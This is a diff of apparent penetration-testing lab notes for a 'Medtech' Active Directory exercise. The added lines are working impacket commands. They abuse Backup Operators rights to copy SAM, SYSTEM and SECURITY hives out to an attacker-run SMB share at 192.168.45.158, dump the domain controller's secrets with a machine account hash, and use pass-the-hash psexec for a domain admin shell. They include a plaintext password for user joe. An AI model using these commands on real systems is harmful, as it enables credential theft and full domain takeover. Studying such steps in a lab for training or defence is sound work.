@@ -1701,20 +1701,15 @@ impacket-secretsdump ituser@<any-domain-joined-machine> -hashes aad3b435b51404ee
 **Medtech**
 1. Achieving local administrator via the Backup Operators group:
 
-	- this all should be done from C:\Temp on a domain joined machine
- 	- https://juggernaut-sec.com/sebackupprivilege/#An_Easier_Way_to_Extract_a_Copy_of_the_Local_SAM_File_Hash_with_SeBackupPrivilege
-    	- diskshadow.txt:
+https://www.youtube.com/watch?v=wUy2VXL2y-w
 ```
-set context persistent nowriters
-SET METADATA .\meta.cab
-add volume c: alias temp
-create
-expose %temp% r:
-```
-```
-diskshadow.exe /s C:\Users\joe\Desktop\diskshadow.txt
-robocopy /b R:\Windows\System32\Config C:\Temp SAM
-robocopy /b R:\Windows\System32\Config C:\Temp SYSTEM
-sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+sudo impacket-smbserver -smb2support share .
+proxychains -q impacket-reg medtech.com/joe:Flowers1@172.16.171.10 backup -o '\\192.168.45.158\share'
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local >> hashes.SAM
+	- recover the DC's computer account hash
+proxychains -q impacket-secretsdump medtech.com/DC01$@172.16.171.10 -hashes ":NTHASH" >> hashes.DC
+	- recover a domain admin's password 
+proxychains -q impacket-psexec -hashes "<:NTHASH>" medtech.com/DomainAdmin@172.16.171.10
+	- achieve a full shell on the DC now that you are domain admin
 ```
 
